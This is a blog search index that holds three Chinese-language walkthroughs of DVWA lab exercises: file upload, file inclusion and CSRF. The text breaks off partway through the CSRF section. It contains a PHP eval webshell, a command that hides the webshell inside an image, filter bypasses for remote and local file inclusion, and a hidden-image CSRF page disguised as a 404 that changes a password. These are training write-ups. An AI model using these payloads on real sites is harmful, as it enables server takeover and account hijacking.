<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DVWA--File Upload</title>
      <link href="2020/11/23/DVWA-File-Upload/"/>
      <url>2020/11/23/DVWA-File-Upload/</url>
      
        <content type="html"><![CDATA[<p>File Upload，即文件上传。文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    //设置上传的目录    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );    //上传目录加上&#39;uploaded&#39;表单参数所提交的文件名    // Can we move the file to the upload folder?    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;    //移动上传的文件到目标路径        // No        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;    &#125;    else &#123;        // Yes!        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;    &#125;&#125;?&gt; </code></pre><p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><p> <em>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。</em></p><p>上传文件</p><p><img src="https://img-blog.csdnimg.cn/20201123162954150.png#pic_center" alt="在这里插入图片描述"></p><p>上传成功后返回路径。</p><p><img src="https://img-blog.csdnimg.cn/20201123163023236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>菜刀链接</p><p><img src="https://img-blog.csdnimg.cn/20201123163044242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code class="php"> &lt;?phpif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );    // File information    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];    //上传的原文件名字    $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];    //上传的原文件类型，通过mime判断        $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];    //上传的原文件大小    // Is it an image?    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;        ( $uploaded_size &lt; 100000 ) ) &#123;    //必须是jpeg或者png类型以及文件大小不超过100K        // Can we move the file to the upload folder?        if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;            // No            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;        &#125;        else &#123;            // Yes!            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;        &#125;    &#125;    else &#123;        // Invalid file        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。</p><p><strong>文件包含+文件上传</strong></p><p>因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。</p><pre><code class="php">&lt;?php@eval($_POST[&#39;hack&#39;])?&gt;</code></pre><p>上传文件</p><p><img src="https://img-blog.csdnimg.cn/20201123163536455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>菜刀连接</p><p><img src="https://img-blog.csdnimg.cn/20201123163544304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>不幸的是，虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息。</p><p>中国菜刀的原理是向上传文件发送包含apple参数的post请求，通过控制apple参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p><p>可以通过文件包含漏洞来获取webshell权限，打开中国菜刀，右键添加，在地址栏中输入<a href="http://192.168.153.130/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.153.130/dvwa/hackable/uploads/hack.png%E5%8F%82%E6%95%B0%E5%90%8D%E4%B8%BAapple%EF%BC%8C%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9php%E3%80%82">http://192.168.153.130/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.153.130/dvwa/hackable/uploads/hack.png参数名为apple，脚本语言选择php。</a></p><p>上传成功，得到webshell权限</p><p>上传hack.png文件，抓包。</p><p><img src="https://img-blog.csdnimg.cn/20201123163812479.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以看到文件类型为image/png，尝试修改filename为hack.php。</p><p><img src="https://img-blog.csdnimg.cn/20201123163815948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Is it an image?     if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) &#123;         // Can we move the file to the upload folder?         if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         &#125;         else &#123;             // Yes!             echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;         &#125;     &#125;     else &#123;         // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     &#125; &#125; ?&gt; </code></pre><p>strrpos(string,find,start)函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p><p>getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型</p><p>采用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，由于实验环境的php版本原因，这里只演示如何借助High级别的文件包含漏洞来完成攻击。</p><p>首先利用copy将一句话木马文件php.php与图片文件1.jpg合并</p><p>打开可以看到，一句话木马藏到了最后。</p><p><img src="https://img-blog.csdnimg.cn/20201123164300231.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>顺利通过文件头检查，可以成功上传。</p><p>菜刀链接，成功拿到webshell</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;     // Check Anti-CSRF token     checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Where are we going to be writing to?     $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;     //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;     $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;     $temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );     $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;     // Is it an image?     if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) &#123;         // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)         if( $uploaded_type == &#39;image/jpeg&#39; ) &#123;             $img = imagecreatefromjpeg( $uploaded_tmp );             imagejpeg( $img, $temp_file, 100);         &#125;         else &#123;             $img = imagecreatefrompng( $uploaded_tmp );             imagepng( $img, $temp_file, 9);         &#125;         imagedestroy( $img );         // Can we move the file to the web root from the temp folder?         if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;             // Yes!             echo &quot;&lt;pre&gt;&lt;a href=&#39;$&#123;target_path&#125;$&#123;target_file&#125;&#39;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;         &#125;         else &#123;             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         &#125;         // Delete any temp files         if( file_exists( $temp_file ) )             unlink( $temp_file );     &#125;     else &#123;         // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>in_get(varname)</p><p>函数返回相应选项的值</p><p>imagecreatefromjpeg ( filename )</p><p>函数返回图片文件的图像标识，失败返回false</p><p>imagejpeg ( image , filename , quality)</p><p>从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。</p><p> imagedestroy( img )</p><p>函数销毁图像资源</p><p>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><p>转载连接：<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p><p>感谢lonehand大佬</p><p>我太菜了，啥也不会。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA--File Inclusion</title>
      <link href="2020/11/23/DVWA-File-Inclusion/"/>
      <url>2020/11/23/DVWA-File-Inclusion/</url>
      
        <content type="html"><![CDATA[<p>文件包含漏洞是一种常见的漏洞。利用这个漏洞去包含危险文件，危险文件中有危险函数。<br>如此一来会造成信息泄露和恶意代码执行。 </p><p>文件包含功能使用include函数将web根目录以外的目录文件包含进来，文件包含功能给开发人员带来了便利。通过把常用的功能归类成文件，文件包含可以提高代码重用率。<br>文件包含漏洞是高危漏洞，往往会导致任意文件读取和任意命令执行，造成严重的安全后果。<br>文件包含往往要使用到目录遍历工具 </p><p>LFI:本地文件包含(Local File Inclusion)<br>RFI:远程文件包含(Remote File Inclusion)</p><p>include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。<br>include_once()：和 include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。<br>require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。<br>require_once()：和 require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt; </code></pre><p>1.本地包含：即包含本地文件</p><p> low级别的代码对包含的文件没有进行任何的过滤</p><p>当我们包含一个不存在的文件 haha.php ，看看会发生什么情况！</p><p><a href="http://127.0.0.1/vulnerabilities/fi/?page=haha.php">http://127.0.0.1/vulnerabilities/fi/?page=haha.php</a></p><p>可以看到，发生了报错，并且把网站的路径都给暴露出来了。</p><p>我们也可以尝试使用../来进行目录穿越（../表示返回上一层目录）</p><p>2.远程文件包含</p><p>在云端搭了一个一句话木马，然后包含该文件看看，发现成功后，菜刀链接，获得webshell</p><p><img src="https://img-blog.csdnimg.cn/20201123154330224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt; </code></pre><p>Medium级别的代码增加了str_replace函数，对page参数进行了处理，将http:// 、https://、 ../、..\替换为空字符，即删除</p><p>所以，<strong>双写</strong>绕过替换规则</p><p>例如page=htt<a href="http://p//192.168.13.130/hello.php%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E5%8F%AA%E4%BC%9A%E5%88%A0%E9%99%A4%E4%B8%80%E4%B8%AAhttp://%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://192.168.13.130/hello.php%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4">http://p://192.168.13.130/hello.php时，str_replace函数只会删除一个http://，于是page=http://192.168.13.130/hello.php，成功执行远程命令</a><br>同时，因为替换的只是../、..\，所以对采用绝对路径(就是不使用…/)的方式包含文件是不会受到任何限制的</p><p>1.本地文件包含</p><p>但是我们如果非要用…/呢？那么我们就可以双写绕过<br>例如使用<a href="http://127.0.0.1:8008/dvwa/vulnerabilities/fi/?page=..././filetest/test.php%EF%BC%8C%E8%BF%99%E6%A0%B7str_replace%E5%8F%AA%E5%88%A0%E9%99%A4%E4%BA%86%E4%B8%80%E4%B8%AA../">http://127.0.0.1:8008/dvwa/vulnerabilities/fi/?page=..././filetest/test.php，这样str_replace只删除了一个../</a></p><p>但是<a href="http://127.0.0.1:8008/dvwa/vulnerabilities/fi/?page=../../filetest/test.php%E5%8D%B4%E4%B8%8D%E8%83%BD%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%AE%83%E7%9B%B4%E6%8E%A5%E6%A3%80%E6%B5%8B%E5%88%B0%E4%BA%86%E4%B8%A4%E4%B8%AA../%EF%BC%8C%E6%89%80%E4%BB%A5%E5%88%A9%E7%94%A8%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%8C%E4%B8%8D%E8%A6%81%E5%8D%95%E7%8B%AC%E8%BF%9E%E8%B5%B7%E6%9D%A5%EF%BC%8C%E8%A6%81%E5%B5%8C%E5%A5%97%E8%B5%B7%E6%9D%A5">http://127.0.0.1:8008/dvwa/vulnerabilities/fi/?page=../../filetest/test.php却不能执行，因为它直接检测到了两个../，所以利用双写绕过，不要单独连起来，要嵌套起来</a></p><p>2.远程文件包含 </p><p>双写绕过法</p><p><img src="https://img-blog.csdnimg.cn/2020112316184815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>把%68%74%74%70%3a%2f%2f192.168.13.130%2fhello.php尝试url编码进行包含<br>经过编码后的url不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的page参数依然是page=<a href="http://192.168.13.130/hello.php%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AF%BB%E5%8F%96%E5%A4%B1%E8%B4%A5">http://192.168.13.130/hello.php，因此读取失败</a></p><p><img src="https://img-blog.csdnimg.cn/20201123161913241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;&#125;?&gt; </code></pre><p>fnmatch(pattern,string,flags)：根据指定的模式来匹配文件名或字符串</p><p>pattern 必需 规定要检索的模式<br>string 必需 规定要检查的字符串或文件<br>flags 可选</p><p>High级别的代码使用了fnmatch函数检查page参数，开头必须为 file* 或者 include.php ，否则会提示Error：File not  found。。看似安全，但是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，file://F:/xampp/htdocs/dvwa/vulnerabilities/filetest/test.php，</p><p><img src="https://img-blog.csdnimg.cn/20201123162106358.png#pic_center" alt="在这里插入图片描述"><br>如果是php文件，则不会解析而是显示其php代码，在html页面或源代码中</p><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的php文件或jpg照片，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行，谨记，php的file://协议只能打开本地文件<br>图片插入一句话木马（b为二进制，a为ascii码）<br>copy xx.jpg/b +xx.php/a xxx.jpg，之后利用菜刀或蚁剑连接，连接时还需要先浏览网站，登陆账号，完成Session认证</p><p>可以看到，成功包含了我们上次的一句话木马图片，把该图片当成php文件执行了</p><p><img src="https://img-blog.csdnimg.cn/2020112316220199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;&#125;?&gt; </code></pre><p>Impossible级别代码使用了白名单机制进行防护，page参数必须为include.php、file1.php、file2.php、file3.php之一，因此彻底消除了文件包含漏洞的产生</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/82823685">文件包含漏洞</a></p><p><a href="https://blog.csdn.net/qq_41617034/article/details/90378977?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160611572219725255553316%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160611572219725255553316&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-11-90378977.pc_search_result_cache&utm_term=DVWA%20%20File%20Inclusion&spm=1018.2118.3001.4449">参考链接</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA--Cross Site Request Forgery (CSRF)</title>
      <link href="2020/11/23/DVWA-Cross-Site-Request-Forgery-CSRF/"/>
      <url>2020/11/23/DVWA-Cross-Site-Request-Forgery-CSRF/</url>
      
        <content type="html"><![CDATA[<p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）</p><p>CSRF形成的原因：</p><p>1、用户在登陆了网站后，没有进行登出，此时访问黑客构造的恶意网页，就会携带自己登陆生成的Cookie访问恶意网页，执行黑客构造的非法请求；</p><p>2、服务器没有对用户的请求进行安全检测，比如没有设置请求来源（Referer）等，导致服务器正常处理了非法请求；</p><p>3、服务器虽设有Referer，但是并未进行严格检查。</p><p>防御：</p><p>1、最重要也是最容易中招的，当属用户本身，用户在进行私密操作时，不要随意点击其他网页。</p><p>2、从服务器方面，可以在在请求头中添加Referer确定访问源，再在会话中加入Token，防止伪造等</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码审计</p><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    //判断是否有点击Change参数    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    //获取新密码    $pass_conf = $_GET[ &#39;password_conf&#39; ];    //获取确认的新密码    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;    //如果两次输入密码相同        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );    //将新密码进行md5保存        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;    //更新密码        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; </code></pre><p>可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）</p><p>随意输入后发现，传参方式是GET型，并修改密码为 111</p><p><img src="https://img-blog.csdnimg.cn/20201123145838572.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>查看请求头，发现存在Cookie</p><p><img src="https://img-blog.csdnimg.cn/2020112314590261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看一下数据库内的密码，并进行MD5还原，发现和修改后的一样</p><p>其实用户信息在登录时候会写入session的。攻击者要利用的就是这个保存在浏览器中的信息。<br>我们可以新建一个test.html文件，内容如下</p><pre><code class="php">&lt;img src=&quot;http://172.25.137.226/vulnerabilities/csrf/?password_new=456&amp;password_conf=456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt;</code></pre><p>这时，如果用户在同一浏览器中打开了以上html文件，显示内容如下</p><p><img src="https://img-blog.csdnimg.cn/20201123150118443.JPG#pic_center" alt="在这里插入图片描述"></p><p>用户只会认为网页问题，不会意识到实际他的登录密码已经被修改为456了。<br>此时可以尝试登录dvwa，密码123已经无效了，只能用456登录。<br>不过，如果换一个浏览器来打开，那就没有用了</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码审计</p><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    // Checks to see where the request came from    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) &#123;        // Get input        $pass_new  = $_GET[ &#39;password_new&#39; ];        $pass_conf = $_GET[ &#39;password_conf&#39; ];        // Do the passwords match?        if( $pass_new == $pass_conf ) &#123;            // They do!            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));            $pass_new = md5( $pass_new );            // Update the database            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );            // Feedback for the user            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;        &#125;        else &#123;            // Issue with passwords matching            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        &#125;    &#125;    else &#123;        // Didn&#39;t come from a trusted source        echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; </code></pre><p>可以看到，新增了个stripos( $_SERVER[ ‘HTTP_REFERER’ ] ,$_SERVER[ ‘SERVER_NAME’ ]) !== false</p><p><em>$_SERVER[‘HTTP_REFERER’]，获取当前链接的上一个连接的来源地址，即链接到当前页面的前一页面的 URL 地址，可以做到防盗链作用。只有点击超链接（即&lt; A href=…&gt;） 打开的页面才有HTTP_REFERER环境变量。</em></p><p>通常下面的一些方式，$_SERVER[‘HTTP_REFERER’] 会无效（为空）：</p><blockquote><p>1.直接输入网址访问该网页。<br>2.Javascript 打开的网址。<br>3.Javascript 重定向（window.location）网址。<br>4.使用 meta refresh 重定向的网址。<br>5.使用 PHP header 重定向的网址。<br>6.flash 